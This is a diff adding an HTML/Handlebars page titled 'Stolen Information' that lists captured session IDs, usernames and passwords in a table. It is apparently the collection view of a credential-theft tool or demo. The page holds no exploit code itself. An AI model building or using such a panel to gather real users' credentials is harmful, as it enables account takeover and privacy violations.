@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Stolen Information</title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+    <!--  CSS -->
+    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon"/>
+    <!-- Bootstrap core CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+    <!-- Fonts from Font Awsome -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+    <!-- CSS Animate -->
+    <link rel="stylesheet" href="css/animate.css"/>
+    <!-- Custom styles for this theme -->
+    <link rel="stylesheet" href="css/main.css"/>
+    <!--  end of CSS -->
+</head>
+<body>
+<h3>Here is stolen information</h3>
+
+<table class="table table-bordered" style="width:400px;">
+    <thead>
+    <tr class="warning"><th>Session</th><th>User</th><th>Password</th></tr>
+    </thead>
+    <tbody>
+    {{#each data}}
+        <tr><td>{{session}}</td><td>{{username}}</td><td>{{password}}</td></tr>
+    {{/each}}
+
+    </tbody>
+</table>
+
+
+
+</body>
+</html>
